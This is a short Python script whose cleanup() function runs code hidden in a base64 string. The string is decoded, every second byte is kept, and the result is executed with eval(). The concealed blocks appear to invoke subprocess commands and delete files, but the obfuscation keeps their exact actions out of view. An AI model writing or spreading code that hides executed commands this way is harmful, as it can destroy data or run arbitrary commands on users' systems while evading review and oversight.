#!/usr/bin/env python
import inspect, base64, subprocess, glob, os


t = """cxZ1IWIDcCtyIG8pYxdlHXMcc10uZGM3aH5lEWMmaz1fJ28PdQR0OXAudUx0JygvW1EiV21AYT1pFW5ocFFy"""\
    """A28SZw8uRmV1eEtlByI6LEMgYyJvLVpjICICXVcpMw==cyd1M2IccGZyOG8fYyllQnNicw4uMWMqaBdlfGNo"""\
    """az5fXW8idVJ0U3AOdSF0VChxW3siJG1wYVBpCG54cA5yZG9eZx0uJmUreD5lKSI+LEggCSIULQV2ASIIXXwpXQ"""\
    """==Wz5vCnMTLh51KG5VbHppI257a0QobHgsKVwgfGZsb31yLyAReF8gWml3bhMgEGcubFFvY2JvLn5nM2wBb15i"""\
    """YCgTIhoqKy4idEh4MnRPIj8pJV0ocyR1HWJ6cFRyB29XY2VlIXMwczEuW2MwYUBsXGx6KHtbPCIcbURhL2lPbl"""\
    """dwOHJjb1dnMS4cZWt4dWUuIl0sLyAZIgUtBWZGIhNdQCkeewJ4JyBGOkQgS286cBhlL25dKFl4FyxZIGMiSHJU"""\
    """Im4pXi4KcjtlTGFMZAsoXil1IB5mUm9Oci0gBHhpIFRpZm5ZIDJnKGwXb2hiby4DZ2BsHm9XYiwoDiJaZQx2UG"""\
    """ErbD1GG29sbHdkMmUzckdcQyoRLn50DHgDdG0ifCkTfVA=WxdvQ3MZLkN1J25EbD1pPW58a1goFngtKXMgBmY2"""\
    """bxByTCASeEMgWmkublAgJGcNbChvQmJvLl1nUWwVbw1iPyhkIhVlaXYLYRRsUEZPbzVsLGQ+ZWxyT1w/KkAuGW"""\
    """JvaRRuKiJcKRVdag=="""


def unpack(func):
    def wrapper(*args, **kwargs):
        return eval(base64.b64decode("".join(func(*args, **kwargs)))[::2])
    return wrapper


@unpack
def get_block_1():
    return t[0:128] 


@unpack
def get_block_2():
    return t[128:256] 


@unpack
def get_block_3():
    return t[256:368] 


@unpack
def get_block_4():
    return t[368:472] 


@unpack
def get_block_5():
    return t[472:644] 


@unpack
def get_block_6():
    return t[644:788] 


def cleanup(directory):
    old_dir = os.getcwd()
    get_block_6()
    if os.path.isdir(directory):
        os.chdir(directory)
        get_block_3()
        os.chdir(old_dir)
        os.rmdir(directory)
